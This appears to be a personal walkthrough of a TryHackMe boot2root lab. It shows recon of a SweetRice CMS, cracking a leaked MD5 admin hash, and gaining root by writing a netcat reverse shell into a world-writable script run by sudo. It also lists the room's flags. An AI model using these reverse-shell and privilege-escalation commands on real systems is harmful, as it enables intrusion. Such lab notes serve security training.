target : 10.10.14.121
user: THM{63e5bce9271952aad1113b6f1ac28a07}
root : THM{6637f41d0177b6f37cb20d775124699f}

┌──(root㉿kali)-[/home/…/CTFs/Boot2root/tryhackme/rooms]
└─# nmap 10.10.14.121                 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-26 07:01 EDT
Nmap scan report for 10.10.14.121
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

┌──(root㉿kali)-[/home/…/CTFs/Boot2root/tryhackme/rooms]
└─# nmap -sC -sV 10.10.14.121

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

dir:
┌──(root㉿kali)-[/home/…/CTFs/Boot2root/tryhackme/rooms]
└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.14.121/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

found : /content
CMS : BasicCMS

Second time fuzz:
┌──(root㉿kali)-[/home/…/CTFs/Boot2root/tryhackme/rooms]
└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.14.121/content/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 2198, Words: 109, Lines: 36]
_themes                 [Status: 301, Size: 322, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
as                      [Status: 301, Size: 317, Words: 20, Lines: 10]
attachment              [Status: 301, Size: 325, Words: 20, Lines: 10]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10]
inc                     [Status: 301, Size: 318, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 2198, Words: 109, Lines: 36]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10]
:: Progress: [4624/4624] :: Job [1/1] :: 47 req/sec :: Duration: [0:00:55] :: Errors: 0 ::

found login here : http://10.10.14.121/content/as/
found a lot of dir and files here : http://10.10.14.121/content/inc/
found also mysql backup : http://10.10.14.121/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
found user and passwd: 
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

crack the hash :
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# john --format=Raw-MD5 lazypass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/wordlists/rockyou.txt
Password123      (?)     
1g 0:00:00:00 DONE 2/3 (2023-08-26 07:16) 12.50g/s 420000p/s 420000c/s 420000C/s coco21..181193
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
login: pass: manager:Password123


PrivEsc:
we have backup.pl in sudo -l
$ cat backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
in copy.sh we have write permission. we are going to add our listner here 
10.8.128.36
i just do
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.128.36 4444 >/tmp/f" > /etc/copy.sh

we need then to run this using sudo  : User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
and now we got root:
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.128.36] from (UNKNOWN) [10.10.14.121] 41546
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
# cd /root
# ls
root.txt
# cat *
THM{6637f41d0177b6f37cb20d775124699f}



















